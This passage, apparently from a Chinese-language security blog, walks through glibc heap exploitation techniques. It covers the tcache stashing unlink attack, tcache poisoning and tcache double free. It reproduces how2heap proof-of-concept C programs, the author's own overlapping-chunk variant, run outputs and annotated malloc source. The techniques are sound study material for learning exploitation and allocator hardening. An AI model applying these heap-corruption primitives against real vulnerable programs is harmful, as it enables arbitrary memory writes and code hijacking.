attack.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we&#x27;ll create the chunk on the stack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// stack_var emulate the fake_chunk we want to alloc to</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stack_var emulates the fake chunk we want to alloc to.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;First let&#x27;s write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk-&gt;bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can see the value of fake_chunk-&gt;bk is:%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Also, let&#x27;s see the initial value of stack_var[4]:%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc 9 chunks with malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="type">unsigned</span> <span class="type">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//put 7 chunks into tcache</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we free 7 of them in order to put them into tcache. Carefully we didn&#x27;t free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//last tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//convert into small bin</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//now 5 tcache bins</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n&quot;</span>,(<span class="type">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//trigger the attack</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">2</span>],(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="type">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">This file demonstrates the stashing unlink attack on tcache.</span><br><span class="line"></span><br><span class="line">This poc has been tested on both glibc <span class="number">2.27</span> and glibc <span class="number">2.29</span>.</span><br><span class="line"></span><br><span class="line">This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it<span class="number">&#x27;</span>s necessary to alloc a chunk with <span class="built_in">calloc</span> at least once. Last not least, we need a writable address to bypass check in glibc</span><br><span class="line"></span><br><span class="line">The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.</span><br><span class="line"></span><br><span class="line">This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this <span class="keyword">case</span> we<span class="number">&#x27;ll</span> create the chunk on the <span class="built_in">stack</span>.</span><br><span class="line"></span><br><span class="line">Stack_var emulates the fake chunk we want to alloc to.</span><br><span class="line"></span><br><span class="line">First let<span class="number">&#x27;</span>s write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[<span class="number">2</span>] as the fake bk. Later we can see *(fake_chunk-&gt;bk + <span class="number">0x10</span>) which is stack_var[<span class="number">4</span>] will be a libc addr after attack.</span><br><span class="line"></span><br><span class="line">You can see the value of fake_chunk-&gt;bk is:<span class="number">0x7fffffffde30</span></span><br><span class="line"></span><br><span class="line">Also, let<span class="number">&#x27;</span>s see the initial value of stack_var[<span class="number">4</span>]:(nil)</span><br><span class="line"></span><br><span class="line">Now we alloc <span class="number">9</span> chunks with <span class="built_in">malloc</span>.</span><br><span class="line"></span><br><span class="line">Then we <span class="built_in">free</span> <span class="number">7</span> of them in order to put them into tcache. Carefully we didn<span class="number">&#x27;</span>t <span class="built_in">free</span> a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another <span class="built_in">malloc</span>.</span><br><span class="line"></span><br><span class="line">As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins <span class="keyword">while</span> chunk0 and chunk2 will be put into unsorted bin.</span><br><span class="line"></span><br><span class="line">Now we alloc a chunk larger than <span class="number">0x90</span> to put chunk0 and chunk2 into small bin.</span><br><span class="line"></span><br><span class="line">Then we <span class="built_in">malloc</span> two chunks to spare space <span class="keyword">for</span> small bins. After that, we now have <span class="number">5</span> tcache bins and <span class="number">2</span> small bins</span><br><span class="line"></span><br><span class="line">Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: <span class="number">0x7fffffffde20</span>.</span><br><span class="line"></span><br><span class="line">Finally we alloc a <span class="number">0x90</span> chunk with <span class="built_in">calloc</span> to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.</span><br><span class="line"></span><br><span class="line">Now our fake chunk has been put into tcache bin[<span class="number">0xa0</span>] <span class="built_in">list</span>. Its fd pointer now point to next <span class="built_in">free</span> chunk: <span class="number">0x6033a0</span> and the bck-&gt;fd has been changed into a libc addr: <span class="number">0x7ffff7dcdd30</span></span><br><span class="line"></span><br><span class="line">As you can see, next <span class="built_in">malloc</span>(<span class="number">0x90</span>) will <span class="keyword">return</span> the region our fake chunk: <span class="number">0x7fffffffde30</span></span><br></pre></td></tr></table></figure><p><strong>tcache有剩余时，small bin下一次malloc时会按照bk指向放入合适tcachebin，在这个过程中只对第一个 bin 进行了完整性检查__glibc_unlikely (bck-&gt;fd !&#x3D; victim)，后面的堆块的检查缺失</strong></p><p><strong>calloc不会在tcachebin里申请内存</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&amp;stack_var</span><br><span class="line"><span class="number">0x7fffffffde20</span></span><br><span class="line">&amp;chunk_lis</span><br><span class="line"><span class="number">0x7fffffffdea0</span></span><br><span class="line">&amp;target</span><br><span class="line"><span class="number">0x7fffffffde18</span></span><br></pre></td></tr></table></figure><ol><li><p>stack_var[3] &#x3D; (unsigned long)(&amp;stack_var[2]);即0x7fffffffde38写入0x7fffffffde30，具体为什么这样后面解释</p><p><img src="/2023/03/27/Tcache_house_of_spirit-unlink/image-20230327234406124.png" alt="image-20230327234406124"></p></li><li><p>先malloc了0xa0(malloc arg&#x3D;0x90)大小的九个堆，我们叫他chunk0-8把</p></li><li><p>把chunk3-chunk8释放掉进入tcachebin</p><img src="/2023/03/27/Tcache_house_of_spirit-unlink/image-20230327232412518.png" alt="image-20230327232412518" style="zoom:80%;"></li><li><p><code>free(chunk_lis[1]);</code>后0xa0tcachebin满7个，<code>free(chunk_lis[0]);free(chunk_lis[2]);</code>会进入unsorted bin</p><img src="/2023/03/27/Tcache_house_of_spirit-unlink/image-20230327232958585.png" alt="image-20230327232958585" style="zoom:80%;"></li><li><p><code>malloc(0xa0);</code>没有合适大小chunk，重新分配一个，但是会触发unsortedbin分类操作，tcache满了，0xa0大小chunk会进入small bin里</p><img src="/2023/03/27/Tcache_house_of_spirit-unlink/image-20230327233240585.png" alt="image-20230327233240585" style="zoom: 80%;"></li><li><p><code>malloc(0x90);malloc(0x90);</code>把tcache前两个申请出来</p></li></ol>   <img src="/2023/03/27/Tcache_house_of_spirit-unlink/image-20230327233621133.png" alt="image-20230327233621133" style="zoom:80%;"><ol start="7"><li><p><code> chunk_lis[2][1] = (unsigned long)stack_var;</code>把chunk2的bk指针改为&amp;stack_var&#x3D;0x7fffffffde20</p><p><img src="/2023/03/27/Tcache_house_of_spirit-unlink/image-20230327233912304.png" alt="image-20230327233912304"></p></li><li><p><code>calloc(1,0x90);</code>FIFO原则，会从smallbin拿走chunk0，这时候tcache有空位，会把small bin里的东西给移到tcachebin</p><p>看下源码怎么从small bin把chunk0拿走的的</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">&#123;</span><br><span class="line">    idx = smallbin_index (nb);</span><br><span class="line">    <span class="comment">// 获取 small bin 的索引</span></span><br><span class="line">    bin = bin_at (av, idx);</span><br><span class="line">    <span class="comment">// 先执行 victim = last(bin)，获取 small bin 的最后一个 chunk</span></span><br><span class="line">    <span class="comment">// 若结果 victim = bin ，那说明该 bin 为空。</span></span><br><span class="line">    <span class="keyword">if</span> ( ( victim = last (bin) ) != bin )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 获取 small bin 中倒数第二个 chunk 。</span></span><br><span class="line">        bck = victim-&gt;bk;</span><br><span class="line">        <span class="comment">// 检查 bck-&gt;fd 是不是 victim，防止伪造</span></span><br><span class="line">        <span class="keyword">if</span> ( __glibc_unlikely( bck-&gt;fd != victim ) )</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">        <span class="comment">// 设置 victim 对应的 inuse 位</span></span><br><span class="line">        set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">        <span class="comment">// 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span></span><br><span class="line">        bin-&gt;bk = bck;</span><br><span class="line">        bck-&gt;fd = bin;</span><br></pre></td></tr></table></figure><p>对chunk0进行bck就是chunk2,victim是chunk0，bck-&gt;fd !&#x3D; victim检测chunk2没有破坏fd指针，绕过，其余没有其他检测bk指针的code， 之后进行unlink操作bin-&gt;bk &#x3D; bck; bck-&gt;fd &#x3D; bin;继续构成循环链表</p><p>看下源码把其余chunk放入tcache bin的</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">         stash them in the tcache.  */</span></span><br><span class="line">      <span class="type">size_t</span> tc_idx = csize2tidx (nb);<span class="comment">//获取size对应的tcache索引</span></span><br><span class="line">      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<span class="comment">//如果这个索引在tcache bin的范围里，也就是这个size属于tcache bin的范围</span></span><br><span class="line">        &#123;</span><br><span class="line">          mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">          <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count<span class="comment">//如果tcache bin没有满</span></span><br><span class="line">             &amp;&amp; (tc_victim = last (bin)) != bin)<span class="comment">//并且small bin不为空,tc_victim为small bin中的最后一个堆块</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              bck = tc_victim-&gt;bk;<span class="comment">//这里取tc_victim的bk指针，并没有针对bck做双向链表完整性检查，因此我们可以去攻击tc_victim的bk指针</span></span><br><span class="line">              set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">            set_non_main_arena (tc_victim);</span><br><span class="line">              bin-&gt;bk = bck;<span class="comment">//将tc_victim从small bin中脱链</span></span><br><span class="line">              bck-&gt;fd = bin;<span class="comment">//如果我们伪造bck，这里就可以将bck-&gt;fd的位置写入一个bin的地址(main_arena+96)</span></span><br><span class="line">              tcache_put (tc_victim, tc_idx);<span class="comment">//将tc_victim链入tc_idx这条链</span></span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">          <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>没有bck-&gt;fd !&#x3D; victim的验证所以我们伪造的chunk不需要伪造fd，这个时候还是先进行unlink操作，第一次是对chunk2进行unlinke，bck为chunk 0x7fffffffde20，bck-&gt;fd&#x3D;bin会在0x7fffffffde30写入bin(small bin)，<strong>这就需要我们首先保证这个伪造地址的bk的fd是可写的</strong></p><p>可以下个条件断点看下 watch *(long *)0x7fffffffde30 </p><img src="/2023/03/27/Tcache_house_of_spirit-unlink/image-20230328012821048.png" alt="image-20230328012821048" style="zoom:80%;"><p>第二次对伪造chunk 0x7fffffffde20进行unlinke bck为之前<strong>第1步</strong>*伪造的0x7fffffffde30，会在0x7fffffffde40写入bin(small bin)</p><p><img src="/2023/03/27/Tcache_house_of_spirit-unlink/image-20230328013130739.png" alt="image-20230328013130739"></p><p>为什么这里0x7fffffffde30不是small bin了呢？是因为被tcache_put (tc_victim, tc_idx)把0x7fffffffde20链入tcachebin时改写了0x7fffffffde30处的next指针</p><p>条件断点看下就可以</p><p><img src="/2023/03/27/Tcache_house_of_spirit-unlink/image-20230328013046989.png" alt="image-20230328013046989"></p><img src="/2023/03/27/Tcache_house_of_spirit-unlink/image-20230327234506290.png" alt="image-20230327234506290" style="zoom:80%;"><p>malloc（0x90）成功申请</p><p>累死</p></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> House Of Spirit </tag>
            
            <tag> Unlink </tag>
            
            <tag> Tcache Attach </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tcache Poisoning &amp;&amp; Tcache Dup</title>
      <link href="/2023/03/27/Tcache_poisoning_dup/"/>
      <url>/2023/03/27/Tcache_poisoning_dup/</url>
      
        <content type="html"><![CDATA[<h2 id="Tcache-Poisoning"><a href="#Tcache-Poisoning" class="headerlink" title="Tcache Poisoning"></a>Tcache Poisoning</h2><p>how2heap tcache_poisoning.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// disable buffering</span></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates a simple tcache poisoning attack by tricking malloc into\n&quot;</span></span><br><span class="line">           <span class="string">&quot;returning a pointer to an arbitrary location (in this case, the stack).\n&quot;</span></span><br><span class="line">           <span class="string">&quot;The attack is very similar to fastbin corruption attack.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n&quot;</span></span><br><span class="line">           <span class="string">&quot;We have to create and free one more chunk for padding before fd pointer hijacking.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> stack_var;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, (<span class="type">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Allocating 2 buffers.\n&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, a);</span><br><span class="line">    <span class="type">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Freeing the buffers...\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n&quot;</span></span><br><span class="line">           <span class="string">&quot;to point to the location to control (%p).\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="type">intptr_t</span>), b, &amp;stack_var);</span><br><span class="line">    b[<span class="number">0</span>] = (<span class="type">intptr_t</span>)&amp;stack_var;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;1st malloc(128): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="type">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;2nd malloc(128): %p\n&quot;</span>, c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We got the control\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    assert((<span class="type">long</span>)&amp;stack_var == (<span class="type">long</span>)c);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer-virtual-machine /m/h/S/h/glibc_2.27&gt; ./tcache_poisoning</span><br><span class="line">This file demonstrates a simple tcache poisoning attack by tricking malloc into</span><br><span class="line">returning a pointer to an arbitrary location (in this case, the stack).</span><br><span class="line">The attack is very similar to fastbin corruption attack.</span><br><span class="line">After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,</span><br><span class="line">We have to create and free one more chunk for padding before fd pointer hijacking.</span><br><span class="line"></span><br><span class="line">The address we want malloc() to return is 0x7fffffffe448.</span><br><span class="line">Allocating 2 buffers.</span><br><span class="line">malloc(128): 0x603260</span><br><span class="line">malloc(128): 0x6032f0</span><br><span class="line">Freeing the buffers...</span><br><span class="line">Now the tcache list has [ 0x6032f0 -&gt; 0x603260 ].</span><br><span class="line">We overwrite the first 8 bytes (fd/next pointer) of the data at 0x6032f0</span><br><span class="line">to point to the location to control (0x7fffffffe448).</span><br><span class="line">Now the tcache list has [ 0x6032f0 -&gt; 0x7fffffffe448 ].</span><br><span class="line">1st malloc(128): 0x6032f0</span><br><span class="line">Now the tcache list has [ 0x7fffffffe448 ].</span><br><span class="line">2nd malloc(128): 0x7fffffffe448</span><br><span class="line">We got the control</span><br></pre></td></tr></table></figure><p>覆盖tachebin的next为我们想申请的地址即可</p><p><img src="/2023/03/27/Tcache_poisoning_dup/image-20230327091111479.png" alt="image-20230327091111479"></p><p><img src="/2023/03/27/Tcache_poisoning_dup/image-20230327091058041.png" alt="image-20230327091058041"></p><p>2.26甚至没有检查tcache的size是否符合要求</p><h2 id="Tcache-Dump"><a href="#Tcache-Dump" class="headerlink" title="Tcache Dump"></a>Tcache Dump</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates a simple double-free attack with tcache.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating buffer.\n&quot;</span>);</span><br><span class="line">    <span class="type">int</span>* a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;malloc(8): %p\n&quot;</span>, a);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing twice...\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the free list has [ %p, %p ].\n&quot;</span>, a, a);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Next allocated buffers will be same: [ %p, %p ].\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">8</span>), <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer-virtual-machine /m/h/S/h/glibc_2.27&gt; ./tcache_dup</span><br><span class="line">This file demonstrates a simple double-free attack with tcache.</span><br><span class="line">Allocating buffer.</span><br><span class="line">malloc(8): 0x555555756260</span><br><span class="line">Freeing twice...</span><br><span class="line">free(): double free detected in tcache </span><br><span class="line">grxer@grxer:~$ ldd --version</span><br><span class="line">ldd (Ubuntu GLIBC 2.27-3ubuntu1.6) 2.27</span><br><span class="line">Copyright (C) 2018 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.  There is NO</span><br><span class="line">warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span><br><span class="line">Written by Roland McGrath and Ulrich Drepper.</span><br></pre></td></tr></table></figure><p>额，因为doublefree crash掉了，2.27的libc不应该呀，找了下资料发现2020.9.10 2.27-3Ubuntu1.3 用glibc2.31源码进行了一波patch</p><p><strong>我们可以利用unsortedbin来overlapping，构造doublefree</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> attack[<span class="number">15</span>] = <span class="string">&quot;6666666&quot;</span>;</span><br><span class="line">    <span class="type">void</span>* fill[<span class="number">7</span>];</span><br><span class="line">    <span class="type">void</span>* unsortbin;</span><br><span class="line">    <span class="type">void</span>* tcachebin;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line">        fill[i] = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    unsortbin = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    tcachebin = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);<span class="comment">//防止和topchunk合并</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line">        <span class="built_in">free</span>(fill[i]);</span><br><span class="line">    <span class="built_in">free</span>(unsortbin);</span><br><span class="line">    <span class="built_in">free</span>(tcachebin);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="built_in">free</span>(tcachebin);</span><br><span class="line">    <span class="type">long</span>* ptr = <span class="built_in">malloc</span>(<span class="number">0xb0</span>);</span><br><span class="line">    ptr[<span class="number">18</span>] = &amp;attack;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="built_in">puts</span>(attack);</span><br><span class="line">    <span class="built_in">strncpy</span>(ptr, <span class="string">&quot;hacker&quot;</span>,<span class="number">7</span>);</span><br><span class="line">    <span class="built_in">puts</span>(attack);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/h/glibc_2<span class="number">.27</span>&gt; ./tcache_dup</span><br><span class="line"><span class="number">6666666</span></span><br><span class="line">hacker</span><br></pre></td></tr></table></figure><p>先把申请到的前七个堆块释放掉</p><p><img src="/2023/03/27/Tcache_poisoning_dup/image-20230327140326972.png" alt="image-20230327140326972"></p><p>这样0x90的tcachebin满7个了</p><p><code>free(unsortbin);</code></p><p>就会丢进unsortedbin里</p><p><img src="/2023/03/27/Tcache_poisoning_dup/image-20230327140512916.png" alt="image-20230327140512916"></p><p><code>free(tcachebin);</code></p><p><img src="/2023/03/27/Tcache_poisoning_dup/image-20230327140608610.png" alt="image-20230327140608610"></p><p>tcachebin的低地址chunk unsortedbin是free的，会触发unlink操作</p><p><img src="/2023/03/27/Tcache_poisoning_dup/image-20230327141113916.png" alt="image-20230327141113916"></p><p><code>malloc(0x80);</code></p><p>让出一个tcachebin</p><p><code>free(tcachebin);</code></p><p>tcachebin进入tcachebin</p><p><img src="/2023/03/27/Tcache_poisoning_dup/image-20230327141335773.png" alt="image-20230327141335773"></p><p>这样我们就实现了chunk的overlapping ，</p><p><code>long* ptr = malloc(0xb0);</code></p><p><code>ptr[18] = 